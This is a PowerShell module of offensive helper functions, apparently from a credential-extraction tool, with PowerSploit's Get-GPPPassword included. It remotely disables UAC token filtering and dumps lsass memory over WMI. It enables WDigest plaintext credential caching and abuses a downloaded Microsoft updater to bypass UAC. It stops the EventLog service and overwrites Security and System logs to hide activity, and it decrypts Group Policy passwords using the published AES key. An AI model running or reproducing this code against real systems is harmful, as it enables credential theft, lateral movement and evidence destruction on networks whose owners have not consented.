function Set-RegistryKey($computername, $parentKey, $nameRegistryKey, $valueRegistryKey) {
<#
.SYNOPSIS
    Set a setting in the registry
    Author: Pierre-Alexandre Braeken (@pabraeken)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None 

.DESCRIPTION
    Set-RegistryKey allows for the configuration of a registry setting

.PARAMETER computername

.PARAMETER parentKey

.PARAMETER nameRegistryKey

.PARAMETER valueRegistryKey
    
.EXAMPLE
    C:\PS> Set-RegistryKey "Server1" "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" "LocalAccountTokenFilterPolicy" "1"
#>
    try{    
        $remoteBaseKeyObject = [microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$computername)     
        $regKey = $remoteBaseKeyObject.OpenSubKey($parentKey,$true)
        $regKey.Setvalue("$nameRegistryKey", "$valueRegistryKey", [Microsoft.Win32.RegistryValueKind]::DWORD) 
        $remoteBaseKeyObject.close()
    }
    catch {
        $_.Exception
    }
}

function Disable-UAC($computername) {
    $parentKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
    $nameRegistryKey = "LocalAccountTokenFilterPolicy"
    $valueRegistryKey = "1"

    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $computername)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Output "Registry key setted, you have to reboot the remote computer"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Output "Registry key setted, you have to reboot the remote computer"
            Stop-Script
        }
    }
}

function CreateDirectoryIfNeeded ( [string] $directory ) {
	if (!(Test-Path -Path $directory -type "Container")) {
		New-Item -type directory -Path $directory > $null
	}
}

function Set-SymbolServer {              
    $cacheDirectory = "c:\SYMBOLS\PUBLIC"     
    $refSrcPath = "$cacheDirectory*http://referencesource.microsoft.com/symbols"
    $msdlPath = "$cacheDirectory*http://msdl.microsoft.com/download/symbols"    
    $envPath = "SRV*$refSrcPath;SRV*$msdlPath"    
    CreateDirectoryIfNeeded -directory $cacheDirectory
    $env:_NT_SYMBOL_PATH = $envPath    
}

function Write-Minidump ($process, $dumpFilePath) {
    $windowsErrorReporting = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic')    
    $flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $miniDumpWriteDump = $windowsErrorReportingNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
        $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))        
        if(!$result) {
            Write-Output "Error : cannot dump the process"
            $fileStream.Close()
            Stop-Script
        }
    }
    catch{
        $_.Exception()       
        Write-Output "Error : cannot dump the process"
        $fileStream.Close()
        Stop-Script 
    }
    $fileStream.Close()       
}

function Write-MiniDumpDBGHelp ($process, $dumpFilePath){
    $MethodDefinition = @'
[DllImport("DbgHelp.dll", CharSet = CharSet.Unicode)]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess,
    uint processId,
    IntPtr hFile,
    uint dumpType,
    IntPtr expParam,
    IntPtr userStreamParam,
    IntPtr callbackParam
    );
'@

    $dbghelp = Add-Type -MemberDefinition $MethodDefinition -Name 'dbghelp' -Namespace 'Win32' -PassThru

    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
        $result = $dbghelp::MiniDumpWriteDump($processHandle,$processId,$fileStream.SafeFileHandle.DangerousGetHandle(),$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
        if(!$result) {
            Write-Output "Error : cannot dump the process"
            $fileStream.Close()
            Stop-Script
        }
    }
    catch{
        $_.Exception.Message
        Write-Output "Error : cannot dump the process"
        $fileStream.Close()
        Stop-Script
    }
    $fileStream.Close()
}

function Run-WmiRemoteProcess {
    Param(
        [string]$computername=$env:COMPUTERNAME,
        [string]$cmd=$(Throw "You must enter the full path to the command which will create the process."),
        [int]$timeout = 0
    )
 
    Write-Output "Process to create on $computername is $cmd"
    [wmiclass]$wmi="\\$computername\root\cimv2:win32_process"
    # Exit if the object didn't get created
    if (!$wmi) {return}
 
    try{
    $remote=$wmi.Create($cmd)
    }
    catch{
        $_.Exception
    }
    $test =$remote.returnvalue
    if ($remote.returnvalue -eq 0) {
        Write-Output ("Successfully launched $cmd on $computername with a process id of " + $remote.processid)
    } else {
        Write-Output ("Failed to launch $cmd on $computername. ReturnValue is " + $remote.ReturnValue)
    }    
    return
}

function Remote-Dumping($computername, $scriptPath, $logDirectoryPath) {
    Copy-Item -Path "$scriptPath\msdsc.exe" -Destination "\\$computername\c$\windows\temp\msdsc.exe"
    $dumpAProcessPath = "C:\Windows\temp\msdsc.exe"
    Run-WmiRemoteProcess $computername "$dumpAProcessPath lsass c:\windows\temp"
    Start-Sleep -Seconds 15
    Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
    Remove-Item -Force "\\$computername\c$\windows\temp\msdsc.exe"
    Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"            
}

function Set-WdigestProvider {
    $parentKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){                  
        New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
        Write-Output "Registry key setted, you have to reboot the local computer"
        Stop-Script
    }
    else {
        $valueSetted = (Get-ItemProperty -Path  $parentKey  -Name $nameRegistryKey).$nameRegistryKey
        if($valueSetted -ne 1) {
            New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null
            Write-Output "Registry key setted, you have to reboot the local computer"
            Stop-Script
        }
    }
}

function Set-RemoteWdigestProvider ($server) {
    $parentKey = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Output "Registry key setted, you have to reboot the remote computer"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Output "Registry key setted, you have to reboot the remote computer"
            Stop-Script
        }
    }
}

function Write-InFile ($buffer, $chain) {
    [io.file]::WriteAllText($buffer, $chain) | Out-Null
}

function Call-MemoryWalker ($memoryWalker, $file, $fullScriptPath) {
    if($mode -eq "2016") {
        $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" -y "$scriptPath\misc\symbols2016TP3"
    }
    else {
        $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" 
    }
    return $tab
}

function Clean-String ($tab, $matches, $snapshot) {    
    if($snapshot -eq $true) {$toAdd = 8;$chain="Implicit"}
    else {$toAdd = 0;$chain = White-Rabbit42}
    $tabA = ($tab -split ' ')     
    if($mode -eq 132) { 
        $start = 20
        $fi = [array]::indexof($tabA,$chain) + 7 + $toAdd
        $foundT = $tabA[$fi]      
        $found = "$foundT"   
    }   
    else {
        if($mode -eq 232) {             
            $fi = [array]::indexof($tabA,$chain) + 7 + $toAdd
            $foundT = $tabA[$fi]      
            $found = "$foundT"   
        }   
        else {
            $fi = [array]::indexof($tabA,$chain) + 10 + $toAdd
            $found1 = $tabA[$fi]    
            $fi = [array]::indexof($tabA,$chain) + 11 + $toAdd
            $found2 = $tabA[$fi]    
            $found = "$found2$found1"   
        }
    }
    return $found
}

function Stop-Script () {   
    Begin{
        Write-Log -streamWriter $global:streamWriter -infoToLog "--- Script terminating ---"
    }
    Process{                        
        End-Log -streamWriter $global:streamWriter       
        Exit
    }
}

function Test-InternetConnection {
    if(![Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet){
        Write-Log -streamWriter $global:streamWriter -infoToLog "The script need an Internet Connection to run"
        Stop-Script
    }
}

function Test-IsInLocalAdministratorsGroup {
    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name    
    $group = Get-CimInstance -ClassName Win32_Group  -Filter "Name = 'Administrators'"    
    $administrators = Get-CimAssociatedInstance -InputObject $group -ResultClassName Win32_UserAccount | select -ExpandProperty Caption         
    if ($administrators -notcontains $me) {
        $false
    }
    else {
        $true
    }
}

function Test-LocalAdminRights {
    $myComputer = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
    $myUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $amIAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent())
    $adminFlag = $amIAdmin.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if($adminFlag -eq $true){
        $adminMessage = " with administrator rights on " 
    }
    else {
        $adminMessage = " without administrator rights on "
    }

    Write-Log -streamWriter $global:streamWriter -infoToLog "RWMC runs with user $($myUser.Name) $adminMessage $myComputer computer"
    return $adminFlag
}

function Set-ActiveDirectoryInformations ($adFlag) {
    if (((gwmi win32_computersystem).partofdomain -eq $true) -and ($adFlag -eq 1)) {
        $global:partOfADomain = 1
        Import-Module activedirectory 
        if (Get-Module -ListAvailable -Name activedirectory) {
            Import-Module activedirectory
        } else {
            Write-Output "Module activedirectory does not exist, importing..."
            Import-Module ServerManager 
            Add-WindowsFeature RSAT-AD-PowerShell        
        }    
        $enterpriseAdminsGroup = "Enterprise Admins"
        $schemaAdminsGroup = "Schema Admins"
        $domainAdminsGroup = "Domain Admins"
        $administratorsGroup = " Administrators"
        $backupOperatorsGroup = "Backup Operators"    
        $global:enterpriseAdmins = ""
        $global:schemaAdmins = ""
        $global:domainAdmins = ""
        $global:administrators = ""
        $global:backupOperators = ""
        try {$global:enterpriseAdmins = (Get-ADGroupMember $enterpriseAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:schemaAdmins = (Get-ADGroupMember $schemaAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:domainAdmins = (Get-ADGroupMember $domainAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:administrators = (Get-ADGroupMember $administratorsGroup -Recursive).DistinguishedName}catch{}
        try {$global:backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}      
    }
}
function Bypass-UAC ($scriptPath, $logDirectoryPath) {               
    $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
    $fileDownloaded = "$logDirectoryPath\rootsupd.exe" 
     
    $webClient = new-object System.Net.WebClient 
    $webClient.DownloadFile($fileToDownload, $fileDownloaded)              

    &$fileDownloaded "/C:C:\Windows\System32\cmd.exe /C $scriptPath\msdsc.exe lsass $logDirectoryPath Title (launch the script from here, you are admin now)"    
}

function Post-HttpRequest($url,$parameters) { 
    $httpRequest = New-Object -ComObject Msxml2.XMLHTTP 
    $httpRequest.open("POST", $url, $false) 
    $httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
    $httpRequest.setRequestHeader("Content-length", $parameters.length); 
    $httpRequest.setRequestHeader("Connection", "close") 
    $httpRequest.send($parameters) 
    $httpRequest.responseText 
}

function Stop-Activities () {
    $eventLogDependancies = (get-service EventLog).dependentservices
    foreach ($dependance in $eventLogDependancies){
        Stop-Service $dependance -Force
    }
    Get-Service eventlog | Set-Service -StartupType disabled 
    Stop-Service eventlog -force
    #$global:serviceToStop = Get-WmiObject -Class Win32_Service -Filter "Name='EventLog'"
    #$global:serviceToStop.StopService() | Out-Null        
}

function Clear-Activities ($scriptPath) {    
    Copy-Item -Path "$scriptPath\misc\Microsoft-Windows-PowerShell%4Operational.evtx" -Destination "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx"
    Copy-Item -Path "$scriptPath\misc\Application.evtx" -Destination "C:\Windows\System32\winevt\Logs\Application.evtx"
    Copy-Item -Path "$scriptPath\misc\System.evtx" -Destination "C:\Windows\System32\winevt\Logs\System.evtx"
    Copy-Item -Path "$scriptPath\misc\Security.evtx" -Destination "C:\Windows\System32\winevt\Logs\Security.evtx"
    Get-Service eventlog | Set-Service -StartupType Automatic
    Start-Service eventlog
    #$global:serviceToStop.StartService() | Out-Null
}

function Get-OperatingSystemMode ($operatingSystem, $osArchitecture) {
    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
        $mode = 3
    }
    else {
        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
            if($osArchitecture -like "64*") {
                $mode = 1
            }
            else {
                $mode = 132
            }
        }
        else {
            if($operatingSystem -eq "6.2.9200"){
                $mode = 2
            }
            else{
                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240"){        
                    if($osArchitecture -like "64*") {  
                        if($operatingSystem -eq "6.3.9600"){
                            $mode = "8.1"       
                        }       
                        else {
                            $mode = "2r2"
                        }
                    }
                    else {
                        $mode = "232"
                    }
                }
                else {
                    if ($operatingSystem -eq "10.0.10514" -or $operatingSystem -eq "10.0.10586"){
                         $mode = "2016"
                    }
                    else {
                        Write-Output "The operating system could not be determined... terminating..."
                        Stop-Script 
                    }
                }
            }
        }
    }
    return $mode
}
 Function LoadColorList {
    $sRGBList = @()
    $sRGBList += "rgb(0, 0, 0)"# -sName "Black"
    $sRGBList += "rgb(0, 0, 128)"# -sName "Navy"
    $sRGBList += "rgb(0, 100, 0)"# -sName "DarkGreen"    
    $sRGBList += "rgb(139, 0, 0)"# -sName "DarkRed"
    $sRGBList += "rgb(148, 0, 211)"# -sName "DarkViolet"
    $sRGBList += "rgb(255, 20, 147)"# -sName "DeepPink"
    $sRGBList += "rgb(0, 206, 209)"# -sName "DarkTurquoise"
    $sRGBList += "rgb(139, 0, 139)"# -sName "DarkMagenta"
    $sRGBList += "rgb(173, 255, 47)"# -sName "GreenYellow"
    $sRGBList += "rgb(240, 230, 140)"# -sName "Khaki"
    $sRGBList += "rgb(255, 250, 240)"# -sName "FloralWhite"
    $sRGBList += "rgb(255, 255, 0)"# -sName "Yellow"
    $sRGBList += "rgb(255, 160, 122)"# -sName "LightSalmon"
    $sRGBList += "rgb(255, 165, 0)"# -sName "Orange"
    $sRGBList += "rgb(255, 215, 0)"# -sName "Gold"
    $sRGBList += "rgb(128, 128, 0)"# -sName "Olive"
    $sRGBList += "rgb(92, 92, 92)"# -sName "Grey"
    $sRGBList += "rgb(135, 206, 235)"# -sName "SkyBlue"
    return $sRGBList
}

function Set-FormulaToShapeAndChildren($shape,$cell,$formula) {
    $shape.CellsU($cell).FormulaU = $formula
    foreach ($subShape in $shape.Shapes) {
    $subShape.CellsU($cell).FormulaForceU = $formula
        foreach ($subShape2 in $subShape.Shapes) {
            $subShape2.CellsU($cell).FormulaForceU = $formula
        }
    }
}
function Get-DecryptMyPassword {
    Param  (
    [Parameter(Position=0,mandatory=$true)]    
    [ValidateNotNullOrEmpty()] 
    [String] $cPassword
    )

    try{
        $mod=($cPassword.length % 4)
        if($mod -ne 0) {
            $pad = "=" * (4 - ($cPassword.Length % 4))
        }
        $base64Decoded = [Convert]::FromBase64String($cPassword + $pad)

        <# 
            https://msdn.microsoft.com/en-us/library/cc422924.aspx?f=255&MSPPError=-2147217396
            All passwords are encrypted using a derived Advanced Encryption Standard (AES) key.<3>
            The 32-byte AES key is as follows:
            4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
            f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
        #>

        $AESObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [byte[]] $AESKey = @(0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 
                            0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 
                            0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b)
        $AESIV = New-Object byte[]($AESObject.IV.Length)
        $AESObject.IV = $AESIV
        $AESObject.Key = $AESKey
        $decryptorObject = $AESObject.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($base64Decoded, 0 , $base64Decoded.Length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($outBlock)
    }
    catch {
        Write-Error "$error[0]"
    }
}

function Convert-ByteArrayToString{
 [CmdletBinding()] Param (
 [Parameter(Mandatory = $True, ValueFromPipeline = $True)] [System.Byte[]] $ByteArray,
 [Parameter()] [String] $Encoding = "ASCII" )

    switch ( $Encoding.ToUpper() ) {
        "ASCII" { $EncodingType = "System.Text.ASCIIEncoding" }
        "UNICODE" { $EncodingType = "System.Text.UnicodeEncoding" }
        "UTF7" { $EncodingType = "System.Text.UTF7Encoding" }
        "UTF8" { $EncodingType = "System.Text.UTF8Encoding" }
        "UTF32" { $EncodingType = "System.Text.UTF32Encoding" }
        Default { $EncodingType = "System.Text.ASCIIEncoding" }
    }
    $Encode = new-object $EncodingType
    $ByteArray = $Encode.GetString($ByteArray)
    return $ByteArray
}

function Get-GPPPassword ($domain) {
<#
.SYNOPSIS
    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 2.4.2
 
.DESCRIPTION
    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
.EXAMPLE
    PS C:\> Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
    Passwords : {password, password1234$}
    UserNames : {administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {DEMO\Administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
.EXAMPLE
    PS C:\> Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
    
    password
    password12
    password123
    password1234
    password1234$
    read123
    Recycling*3ftw!
.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
       
    #Some XML issues between versions
    Set-StrictMode -Version 2
    
    #define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )
       
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)
            
        switch ($Mod) {
        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        '2' {$Cpassword += ('=' * (4 - $Mod))}
        '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)        
    }

    #define helper function to parse fields from xml files
    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            $File 
        )
                
        $Filename = Split-Path $File -Leaf
        [xml] $Xml = Get-Content ($File)

        #declare empty arrays
        $Cpassword = @()
        $UserName = @()
        $NewName = @()
        $Changed = @()
        $Password = @()
    
        #check for password field
        if ($Xml.innerxml -like "*cpassword*"){
            
            Write-Verbose "Potential password in $File"
                
            switch ($Filename) {

                'Groups.xml' {
                    $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                }
        
                'Services.xml' {  
                    $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                }
        
                'Scheduledtasks.xml' {
                    $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                }
        
                'DataSources.xml' { 
                    $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                }
                    
                'Printers.xml' { 
                    $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                }
  
                'Drives.xml' { 
                    $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                }
            }
        }
                     
        foreach ($Pass in $Cpassword) {
            Write-Verbose "Decrypting $Pass"
            $DecryptedPassword = Get-DecryptedCpassword $Pass
            Write-Verbose "Decrypted a password of $DecryptedPassword"
            #append any new passwords to array
            $Password += , $DecryptedPassword
        }
            
        #put [BLANK] in variables
        if (!($Password)) {$Password = '[BLANK]'}
        if (!($UserName)) {$UserName = '[BLANK]'}
        if (!($Changed)) {$Changed = '[BLANK]'}
        if (!($NewName)) {$NewName = '[BLANK]'}
                  
        #Create custom object to output results
        $ObjectProperties = @{'Passwords' = $Password;
                                'UserNames' = $UserName;
                                'Changed' = $Changed;
                                'NewName' = $NewName;
                                'File' = $File}
                
        $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Write-Verbose "The password is between {} and may be more than one value."
        if ($ResultsObject) {Return $ResultsObject}         
    }    
   
    #ensure that machine is domain joined and script is running as a domain account
    if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
        throw 'Machine is not a domain member or User is not a member of the domain.'
    }
    
    #discover potential files containing passwords ; not complaining in case of denied access to a directory
    Write-Verbose 'Searching the DC. This could take a while.'
    $XMlFiles = Get-ChildItem -Path "\\$domain\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
    
    if ( -not $XMlFiles ) {throw 'No preference files found.'}

    Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
    foreach ($File in $XMLFiles) {
        $Result = (Get-GppInnerFields $File.Fullname)
        Write-Output $Result
    }
}